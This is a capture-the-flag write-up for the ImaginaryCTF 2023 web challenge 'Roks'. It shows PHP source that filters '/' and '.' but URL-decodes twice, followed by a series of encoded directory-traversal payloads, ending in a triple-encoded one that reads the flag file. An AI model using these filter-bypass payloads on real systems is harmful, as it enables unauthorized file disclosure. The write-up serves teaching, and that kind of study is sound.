---
name: Roks (2023)
event: Imaginary 2023
category: Web
description: Writeup for Roks (Web) - Imaginary (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Roks

## Description

> My rock enthusiast friend made a website to show off some of his pictures. Could you do something with it?

Source code is provided, so let's review it before we check [the site](http://roks.chal.imaginaryctf.org).

## Recon

The `Dockerfile` shows us where to look for the flag.

{% code overflow="wrap" %}
```dockerfile
COPY flag.png /
```
{% endcode %}

`index.php` has a function to GET a random image.

{% code overflow="wrap" %}
```js
function requestRandomImage() {
    var imageList = [
        "image1",
        "image2",
        "image3",
        "image4",
        "image5",
        "image6",
        "image7",
        "image8",
        "image9",
        "image10",
    ];

    var randomIndex = Math.floor(Math.random() * imageList.length);
    var randomImageName = imageList[randomIndex];

    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            var blob = xhr.response;
            var imageUrl = URL.createObjectURL(blob);
            document.getElementById("randomImage").src = imageUrl;
        }
    };

    xhr.open("GET", "file.php?file=" + randomImageName, true);
    xhr.responseType = "blob";
    xhr.send();
}
```
{% endcode %}

You'll notice that it makes a request to `file.php` with a user-controllable GET parameter, possible LFI. Checking the source, we'll see that parameters including `/` or `.` will be blocked, preventing us from using directory traversal, e.g. `../../`.

{% code overflow="wrap" %}
```php
$filename = urldecode($_GET["file"]);
if (str_contains($filename, "/") or str_contains($filename, ".")) {
    $contentType = mime_content_type("stopHacking.png");
    header("Content-type: $contentType");
    readfile("stopHacking.png");
} else {
    $filePath = "images/" . urldecode($filename);
    $contentType = mime_content_type($filePath);
    header("Content-type: $contentType");
    readfile($filePath);
}
```
{% endcode %}

## Solution

We load the site and click the `get rok picture`. Each time, it retrieves a new random rock picture. The URL doesn't change but we know from the source code, we can simply access a URL like: http://roks.chal.imaginaryctf.org/file.php?file=image1

We try LFI: http://roks.chal.imaginaryctf.org/file.php?file=../../../flag.png

As expected, we get the `stopHacking.png` which tells us to `STOP HACKING OUR COMPUTER.. YOU HACKERS`.

Let's try with URL encoding: `%2e%2e%2f%2e%2e%2f%2e%2e%2fflag.png`

No difference, but I realised we aren't allowed a single dot in the string, so tried `%2e%2e%2f%2e%2e%2f%2e%2e%2fflag%2epng` but no luck.

Tried to double-URL encode: `%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66flag%25%32%65png`

Still no luck, so I tried URL encode with unicode: `%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fflag%u002epng`

This time, we get some errors.

{% code overflow="wrap" %}
```txt
Warning: mime_content_type(images/%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fflag%u002epng): Failed to open stream: No such file or directory in /var/www/html/file.php on line 9

Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/file.php:9) in /var/www/html/file.php on line 10

Warning: readfile(images/%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fflag%u002epng): Failed to open stream: No such file or directory in /var/www/html/file.php on line 11
```
{% endcode %}

Hmmm OK so reviewing the code again, notice that it first URL decodes the filename.

{% code overflow="wrap" %}
```php
$filename = urldecode($_GET["file"]);
```
{% endcode %}

Next, it checks if the filename contains `/` or `.` and if it doesn't, it will URL decode the filename a second time.

{% code overflow="wrap" %}
```php
$filePath = "images/" . urldecode($filename);
```
{% endcode %}

This made me think my approach of double URL encoding was correct, I'd just failed to directory traverse far enough since `/var/www/html/images/` requires `../../../../` to get back to the root directory: `%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66flag%25%32%65png`

Still doesn't work 😬 Maybe I need to triple URL encode: `%2525%2532%2565%2525%2532%2565%2525%2532%2566%2525%2532%2565%2525%2532%2565%2525%2532%2566%2525%2532%2565%2525%2532%2565%2525%2532%2566%2525%2532%2565%2525%2532%2565%2525%2532%2566%2525%2536%2536%2525%2536%2563%2525%2536%2531%2525%2536%2537%2525%2532%2565%2525%2537%2530%2525%2536%2565%2525%2536%2537`

Yep, that did the trick! We get a PNG image containing the flag. I'm too lazy to type it out, so I extract the text from the image.

{% code overflow="wrap" %}
```bash
sudo apt-get install tesseract-ocr
```
{% endcode %}

{% code overflow="wrap" %}
```bash
tesseract file.png stdout
ictf{tr4nsv3rsing Ov3r_rOk5_6a3367}
```
{% endcode %}

Tesseract got 4 characters wrong 🙄 Manually corrected the flag!

Flag: `ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367}`
